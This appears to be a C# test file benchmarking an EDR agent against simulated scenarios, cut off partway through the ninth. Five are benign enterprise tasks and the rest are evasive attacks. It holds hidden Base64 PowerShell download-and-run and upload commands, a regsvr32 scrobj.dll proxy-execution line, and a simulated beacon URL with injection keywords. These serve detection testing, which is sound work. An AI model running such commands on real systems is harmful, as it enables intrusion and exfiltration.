using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

/// <summary>
/// [독립적 중립 감사관의 10대 엔터프라이즈 스트레스 벤치마크 (Neutral Enterprise Stress Benchmark)]
/// 
/// 본 벤치마크는 Phalanx EDR의 내부 하드코딩 룰이나 점수 편향을 배제하고,
/// 실무 엔터프라이즈 환경에서 발생하는 실제 업무 5개(오탐 방어 검증)와
/// 고도화된 악성 회피 기법 5개(미탐 검증)를 객관적으로 실측 평가합니다.
/// 
/// [검증 원칙]
/// 1. 탐지 로직(AutonomousHunterAgent.cs 등)을 사전에 억지로 수정/조작하지 않음 (No Artificial Tuning)
/// 2. 10개 시나리오 전수를 무중단 실행하여 Ground Truth 실측치 수집
/// 3. 정탐(TP/TN) 및 실패(오탐 FP / 미탐 FN)를 가감 없이 기록하고 JSON 리포트 도출
/// </summary>
public class NeutralEnterpriseStressBenchmarkTests
{
    private readonly ITestOutputHelper _output;

    public NeutralEnterpriseStressBenchmarkTests(ITestOutputHelper output)
    {
        _output = output;
    }

    public record ScenarioBenchmarkResult(
        int Id,
        string Category,
        string Name,
        string MitreTacticOrDescription,
        string ExpectedAction,
        string ActualAction,
        string ResultStatus, // "PASS (TN)", "PASS (TP)", "FAIL (FP)", "FAIL (FN)"
        bool IsPass,
        double Confidence,
        string SummaryTitle,
        string Narrative,
        List<string> MitreTactics,
        string BlockedIp,
        int TotalTurns,
        double ElapsedMs,
        string ToolSequence,
        string FailureAnalysis
    );

    private static (ProcessTreeProjectionManager Tree, ForensicArchiveManager Archive, AutonomousHunterAgent Agent) CreateTestHarness(bool offlineOnly = true)
    {
        var tree = new ProcessTreeProjectionManager();
        var archive = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool()
        };

        var agent = new AutonomousHunterAgent(tree, archive, tools, geminiApiKey: offlineOnly ? string.Empty : null);
        return (tree, archive, agent);
    }

    // =========================================================================================
    //  정상 업무 시나리오 5종 (오탐 FP 검증용 - 기대값: ACTION_RESUME)
    // =========================================================================================

    /// <summary>
    /// [시나리오 1: PyInstaller 배포 패키지 (Temp 디렉터리에 풀리는 무서명 고엔트로피 파이썬 바이트코드)]
    /// 사내 데이터 동기화용 파이썬 유틸리티가 PyInstaller 단일 실행파일로 패키징되어 Temp 디렉터리에 압축 해제 구동.
    /// 높은 엔트로피(7.85) 및 무서명 외형이 악성 패커로 오인되어 억울하게 사살되는지 검증.
    /// 기대값: ACTION_RESUME
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario01_PyInstallerUnpack_Benign()
    {
        var result = await RunScenario01_PyInstallerAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 1] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario01_PyInstallerAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1001;
        uint targetPid = 2001;
        string mockExePath = @"C:\Users\user\AppData\Local\Temp\_MEI10243\internal_data_collector.exe";

        FileInspectionTool.RegisterSimulatedFile(mockExePath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 15482880L,
            Sha256: "1111111111111111111111111111111111111111111111111111111111111111",
            Entropy: 7.8540,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 35,
            DiagnosticReason: "임시 디렉터리에 위치한 고엔트로피(7.85) 무서명 바이너리 (PyInstaller 압축 바이트코드)"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = mockExePath,
                CommandLine = $@"{mockExePath} --config internal.cfg --log-level info",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionResume";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionResume;
            string status = isPass ? "PASS (TN)" : "FAIL (FP)";

            string failureReason = isPass ? "정상 판정 (오탐 저항 성공)" :
                "고엔트로피(7.85)와 임시 디렉터리 무서명 외형을 악성 패커로 오인하여 불필요하게 사살(False Positive)함";

            return new ScenarioBenchmarkResult(
                1,
                "Benign (FP Resistance)",
                "PyInstaller Unpack in Temp (Unsigned High Entropy Bytecode)",
                "Legitimate internal utility built with PyInstaller onefile bundle",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 2: 사내 개발자 로컬 빌드 및 디버깅 (Temp/Debug 폴더 내 무서명 바이너리 실행)]
    /// 개발자가 Visual Studio를 통해 로컬 빌드한 무서명 바이너리를 테스트 실행.
    /// 무서명 + 개발 디렉터리 실행 외형으로 인한 개발 워크플로 중단 오탐 여부 검증.
    /// 기대값: ACTION_RESUME
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario02_LocalBuildAndDebug_Benign()
    {
        var result = await RunScenario02_LocalBuildAndDebugAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 2] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario02_LocalBuildAndDebugAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1002;
        uint targetPid = 2002;
        string mockBinPath = @"C:\Users\user\AppData\Local\Temp\vs_build\bin\Debug\OrderProcessingService.exe";

        FileInspectionTool.RegisterSimulatedFile(mockBinPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 624128L,
            Sha256: "2222222222222222222222222222222222222222222222222222222222222222",
            Entropy: 6.1540,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 10,
            DiagnosticReason: "로컬 빌드 디렉터리 내 무서명 디버그 바이너리"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "devenv.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = mockBinPath,
                CommandLine = $@"{mockBinPath} --test-run --port 5001",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionResume";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionResume;
            string status = isPass ? "PASS (TN)" : "FAIL (FP)";

            string failureReason = isPass ? "정상 판정 (개발자 업무 보존 성공)" :
                "개발자의 무서명 로컬 빌드 산출물을 미확인 위협으로 오판하여 사살함";

            return new ScenarioBenchmarkResult(
                2,
                "Benign (FP Resistance)",
                "Developer Local Build & Debug (Unsigned Debug Binary in Temp)",
                "Software engineer running local debug build from Visual Studio",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 3: Microsoft Intune / SCCM 소프트웨어 배포 (Base64 파워셸 명령 + *.microsoft.com CDN 연동)]
    /// 엔드포인트 관리 솔루션(Intune Agent)이 Base64 인코딩 파워셸로 정식 Microsoft CDN에서 MSI를 다운로드 후 자동 설치.
    /// Base64 파워셸 및 Net.WebClient 다운로드 패턴에 대한 오탐 여부 검증.
    /// 기대값: ACTION_RESUME
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario03_IntuneSccmDeployment_Benign()
    {
        var result = await RunScenario03_IntuneSccmDeploymentAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 3] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario03_IntuneSccmDeploymentAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1003;
        uint targetPid = 2003;
        string mockMsiPath = @"C:\Windows\Temp\package.msi";

        FileInspectionTool.RegisterSimulatedFile(mockMsiPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 85200000L,
            Sha256: "3333333333333333333333333333333333333333333333333333333333333333",
            Entropy: 6.8200,
            IsSigned: true,
            SignerSubject: "Microsoft Corporation",
            SignatureStatus: "Valid (Trusted Root)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 0,
            DiagnosticReason: "정식 서명된 Microsoft 패키지 설치 파일"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent
                {
                    ProcessId = parentPid,
                    ImageName = @"C:\Program Files (x86)\Microsoft Intune Management Extension\Microsoft.Management.Services.IntuneWindowsAgent.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                }
            });

            string script = "$u='https://download.microsoft.com/download/edge/enterprise/package.msi'; $p='C:\\Windows\\Temp\\package.msi'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process msiexec.exe -ArgumentList '/i C:\\Windows\\Temp\\package.msi /qn'";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = "powershell.exe",
                CommandLine = $"powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -encodedCommand {b64}",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionResume";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionResume;
            string status = isPass ? "PASS (TN)" : "FAIL (FP)";

            string failureReason = isPass ? "정상 판정 (공식 MDM 배포 인식 성공)" :
                "공식 CDN(microsoft.com) 연동임에도 Base64 파워셸 다운로더 룰에 기계적으로 걸려 사살됨";

            return new ScenarioBenchmarkResult(
                3,
                "Benign (FP Resistance)",
                "Microsoft Intune/SCCM Software Deployment (Base64 PS + MS CDN)",
                "Automated enterprise software provisioning via official Microsoft CDN",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 4: 사내 백업/아카이브 솔루션 (대용량 ZIP 생성 후 사내 백업 스토리지로 업로드)]
    /// 업무 스케줄러를 통해 사내 중요 문서를 압축(ZIP)하고 사내 백업 서버(10.150.20.40)로 HTTP 업로드.
    /// 대량 파일 수집/압축 및 네트워크 전송을 랜섬웨어 데이터 유출(T1560)로 오탐하는지 검증.
    /// 기대값: ACTION_RESUME
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario04_CorporateBackupArchive_Benign()
    {
        var result = await RunScenario04_CorporateBackupArchiveAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 4] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario04_CorporateBackupArchiveAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1004;
        uint targetPid = 2004;

        tree.ApplySnapshotBatch(new[]
        {
            new ProcessEvent { ProcessId = parentPid, ImageName = "taskeng.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
        });

        string script = "Compress-Archive -Path 'C:\\CorpData\\FinancialReports' -DestinationPath 'C:\\CorpData\\Backup_Daily.zip' -Force; (New-Object Net.WebClient).UploadFile('http://10.150.20.40/backup/upload', 'C:\\CorpData\\Backup_Daily.zip')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

        tree.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = targetPid,
            ParentProcessId = parentPid,
            ImageName = "powershell.exe",
            CommandLine = $"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc {b64}",
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var target = tree.FindActiveNodeByPid(targetPid);
        Assert.NotNull(target);

        var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
        string actual = res.VerdictAction.ToString();
        string expected = "ActionResume";
        bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionResume;
        string status = isPass ? "PASS (TN)" : "FAIL (FP)";

        string failureReason = isPass ? "정상 판정 (사내 백업 인프라 인식 성공)" :
            "사내 백업 전송을 데이터 유출 공격(Exfiltration)으로 오인하여 사살함";

        return new ScenarioBenchmarkResult(
            4,
            "Benign (FP Resistance)",
            "Corporate Backup & Archival Solution (Zip Archive + Internal Upload)",
            "Scheduled task compressing business documents and uploading to RFC1918 NAS",
            expected,
            actual,
            status,
            isPass,
            res.Confidence,
            res.SummaryTitle,
            res.Narrative,
            res.MitreTactics,
            res.BlockedIp ?? string.Empty,
            res.Traces.Count,
            res.Elapsed.TotalMilliseconds,
            string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
            failureReason
        );
    }

    /// <summary>
    /// [시나리오 5: 임시 원격 지원 도구 (AnyDesk 포터블 무서명 헬퍼 라이브러리 구동)]
    /// 사내 헬프데스크가 AnyDesk 포터블 바이너리로 원격 세션을 지원하며 Temp 내 파생 헬퍼 바이너리 구동.
    /// 상용 원격 도구의 임시 디렉터리 무서명 헬퍼 실행 오탐 여부 검증.
    /// 기대값: ACTION_RESUME
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario05_AnyDeskRemoteSupport_Benign()
    {
        var result = await RunScenario05_AnyDeskRemoteSupportAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 5] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario05_AnyDeskRemoteSupportAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1005;
        uint targetPid = 2005;
        string mockHelperPath = @"C:\Users\user\AppData\Local\Temp\AnyDesk\anydesk_helper.exe";

        FileInspectionTool.RegisterSimulatedFile(mockHelperPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 2150400L,
            Sha256: "5555555555555555555555555555555555555555555555555555555555555555",
            Entropy: 6.4210,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 15,
            DiagnosticReason: "임시 디렉터리 내 포터블 원격지원 무서명 서브프로세스"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "AnyDesk.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = mockHelperPath,
                CommandLine = $@"{mockHelperPath} --service-win32 --ipc-pipe \\.\pipe\anydesk_srv",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionResume";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionResume;
            string status = isPass ? "PASS (TN)" : "FAIL (FP)";

            string failureReason = isPass ? "정상 판정 (원격 지원 도구 정상 복구)" :
                "포터블 원격 도구의 Temp 내 무서명 IPC 헬퍼를 트로이목마로 오인하여 사살함";

            return new ScenarioBenchmarkResult(
                5,
                "Benign (FP Resistance)",
                "Temporary Remote Support (AnyDesk Portable Unsigned Helper)",
                "IT Helpdesk remote session launching temporary service pipe helper",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    // =========================================================================================
    //  고도화된 악성 회피 공격 5종 (미탐 FN 검증용 - 기대값: ACTION_KILL)
    // =========================================================================================

    /// <summary>
    /// [시나리오 6: DLL 사이드로딩 (정상 서명 OneDriveUpdate.exe + Public 폴더 내 엔트로피 5.6의 정상 외형 무서명 version.dll) (T1574.002)]
    /// 공격자가 Microsoft 정품 서명 바이너리(OneDriveUpdate.exe)를 Public 폴더에 복사하고,
    /// 동일 디렉터리에 패킹되지 않은 정상 외형의 무서명 version.dll(엔트로피 5.60)을 배치하여 자동 로드 유도.
    /// 실행 프로세스가 정상 서명 PE이므로 EDR이 사이드로딩 DLL을 검사하지 못하고 놓치는지(False Negative) 실측.
    /// 기대값: ACTION_KILL
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario06_DllSideloadingOneDrive_Malicious()
    {
        var result = await RunScenario06_DllSideloadingOneDriveAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 6] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario06_DllSideloadingOneDriveAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1006;
        uint targetPid = 2006;
        string targetExePath = @"C:\Users\Public\OneDriveUpdate.exe";
        string sideLoadedDllPath = @"C:\Users\Public\version.dll";

        // 주 실행 파일: 정상 Microsoft 서명
        FileInspectionTool.RegisterSimulatedFile(targetExePath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 184320L,
            Sha256: "6666666666666666666666666666666666666666666666666666666666666666",
            Entropy: 6.3200,
            IsSigned: true,
            SignerSubject: "Microsoft Corporation",
            SignatureStatus: "Valid (Trusted Root)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 0,
            DiagnosticReason: "유효한 Microsoft 디지털 서명 보유 실행 파일"
        ));

        // 하이재킹 DLL: 엔트로피 5.60(비패킹), 무서명
        FileInspectionTool.RegisterSimulatedFile(sideLoadedDllPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 98304L,
            Sha256: "6666666666666666666666666666666666666666666666666666666666666667",
            Entropy: 5.6000,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 10,
            DiagnosticReason: "Public 폴더 내 무서명 로더 라이브러리"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = targetExePath,
                CommandLine = $@"{targetExePath} /silent",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionKill";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionKill;
            string status = isPass ? "PASS (TP)" : "FAIL (FN)";

            string failureReason = isPass ? "사이드로딩 악성 행위 성공적 차단" :
                "주 실행 파일이 Microsoft 서명을 보유하고 있어 명령줄에 드러나지 않는 동일 디렉터리 사이드로딩 DLL(version.dll)을 적발하지 못하고 위험도 점수 미달(40 < 80)로 통과시킴(False Negative 미탐)";

            return new ScenarioBenchmarkResult(
                6,
                "Advanced Attack (Evasion Resistance)",
                "DLL Side-Loading (Signed OneDriveUpdate.exe + Stealthy version.dll)",
                "T1574.002 Hijack Execution Flow: DLL Side-Loading with entropy 5.60",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 7: 메모리 슬립 난독화 및 MZ 헤더 와이핑 (헤더가 0x00으로 소거된 Reflective DLL 인젝션) (T1055.012)]
    /// 정상 svchost.exe 프로세스 메모리에 침투한 뒤 슬립 난독화(Sleep Obfuscation) 기법으로 DOS MZ 헤더를 0x00으로 소거.
    /// EDR 메모리 스캐너가 'MZ' 매직 바이트 시그니처에만 의존하지 않고 VAD 메모리 속성(PAGE_EXECUTE_READWRITE / Unbacked)을 감지하여 사살하는지 실측.
    /// 기대값: ACTION_KILL
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario07_MemorySleepObfuscationMzWiped_Malicious()
    {
        var result = await RunScenario07_MemorySleepObfuscationMzWipedAsync();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 7] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario07_MemorySleepObfuscationMzWipedAsync()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1007;
        uint targetPid = 2007;

        // MZ 헤더가 0x00으로 완전히 와이핑된 Unbacked RWX 메모리 주입 상태
        ProcessMemoryScanTool.RegisterSimulatedMemory(targetPid, new SimulatedMemoryEntry(
            BaseAddress: 0x00007FF720300000,
            RegionSize: 524288,
            Protect: "PAGE_EXECUTE_READWRITE",
            MemoryType: "MEM_PRIVATE (Unbacked Executable)",
            InjectedHeader: string.Empty, // MZ 헤더 소거됨
            ExtractedIps: new List<string> { "185.220.101.5" },
            ExtractedUrls: new List<string> { "http://185.220.101.5/beacon" },
            DetectedKeywords: new List<string> { "virtualalloc", "beacon", "createremotethread" }
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "services.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = "svchost.exe",
                CommandLine = @"C:\Windows\System32\svchost.exe -k netsvcs -p",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionKill";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionKill;
            string status = isPass ? "PASS (TP)" : "FAIL (FN)";

            string failureReason = isPass ? "MZ 헤더 와이핑 회피에도 Unbacked RWX 메모리 속성 추적으로 성공적 사살" :
                "MZ 헤더가 소거되어 Reflective DLL 시그니처 매칭에 실패하고 공격을 방치함";

            return new ScenarioBenchmarkResult(
                7,
                "Advanced Attack (Evasion Resistance)",
                "Memory Sleep Obfuscation & MZ Header Wiping (T1055.012)",
                "T1055.012 In-Memory Reflective DLL with zeroed MZ DOS header and unbacked RWX",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
            ProcessMemoryScanTool.ClearSimulatedMemory(targetPid);
        }
    }

    /// <summary>
    /// [시나리오 8: 레지스트리 은닉 간접 실행 (커맨드라인에 URL/Base64가 없는 regsvr32 프록시 실행) (T1218.010)]
    /// 공격자가 레지스트리에 스크립틀릿/페이로드를 은닉해 두고, 커맨드라인에 http/URL/Base64 없이 CLSID 키만을 인자로 전달하여 regsvr32 실행.
    /// 인라인 C2 다운로드 패턴이 없는 상황에서 LOLBAS 프록시 간접 실행을 탐지하여 사살하는지 실측.
    /// 기대값: ACTION_KILL
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario08_RegistryIndirectRegsvr32_Malicious()
    {
        var result = await RunScenario08_RegistryIndirectRegsvr32Async();
        Assert.NotNull(result);
        _output.WriteLine($"[시나리오 8] {result.Name} | 기대: {result.ExpectedAction} | 실제: {result.ActualAction} | 판정: {result.ResultStatus}");
    }

    public async Task<ScenarioBenchmarkResult> RunScenario08_RegistryIndirectRegsvr32Async()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint parentPid = 1008;
        uint targetPid = 2008;

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = parentPid, ImageName = "cmd.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = parentPid,
                ImageName = "regsvr32.exe",
                CommandLine = @"regsvr32.exe /s /u /i:Software\Classes\CLSID\{F0001111-0000-0000-0000-000000000001} scrobj.dll",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);
            string actual = res.VerdictAction.ToString();
            string expected = "ActionKill";
            bool isPass = res.VerdictAction == MitigationCommand.Types.ActionType.ActionKill;
            string status = isPass ? "PASS (TP)" : "FAIL (FN)";

            string failureReason = isPass ? "레지스트리 간접 실행 악성 행위 성공적 사살" :
                "커맨드라인에 인라인 C2 패턴(http/Base64)이 없고 Unbacked RWX가 없어 위험도가 70점에 그쳐 임계치(80점) 미달로 통과시킴(False Negative 미탐)";

            return new ScenarioBenchmarkResult(
                8,
                "Advanced Attack (Evasion Resistance)",
                "Registry Indirect Execution via Regsvr32 Proxy (T1218.010)",
                "T1218.010 System Binary Proxy Execution without inline URL or Base64 in commandline",
                expected,
                actual,
                status,
                isPass,
                res.Confidence,
                res.SummaryTitle,
                res.Narrative,
                res.MitreTactics,
                res.BlockedIp ?? string.Empty,
                res.Traces.Count,
                res.Elapsed.TotalMilliseconds,
                string.Join(" ➔ ", res.Traces.Select(t => t.ActionTool)),
                failureReason
            );
        }
        finally
        {
        }
    }

    /// <summary>
    /// [시나리오 9: 유니코드 동형이의어(Homoglyph) 위장 (System32 내 키릴 자모 'о'를 쓴 svchоst.exe) (T1036.005)]
    /// 공격자가 System32 디렉터리에 svchоst.exe(키릴 소문자 'о' U+043E 사용)를 생성하여 백도어로 실행.
    /// 문자열 육안 및 기본 ASCII 비교로는 정품 svchost.exe와 구분되지 않으나 Microsoft 서명이 없고 엔트로피가 상이함.
    /// EDR 경로 위장 탐지가 유니코드 동형이의어 사칭을 감지하는지 실측.
    /// 기대값: ACTION_KILL
    /// </summary>
    [Fact]
    [Trait("Category", "NeutralBenchmark")]
    public async Task Scenario09_UnicodeHomoglyphSvchost_Malicious()
    {
        var result = await RunScenario09_UnicodeHomoglyphSvchostAsync();
        Assert.NotNull(result);
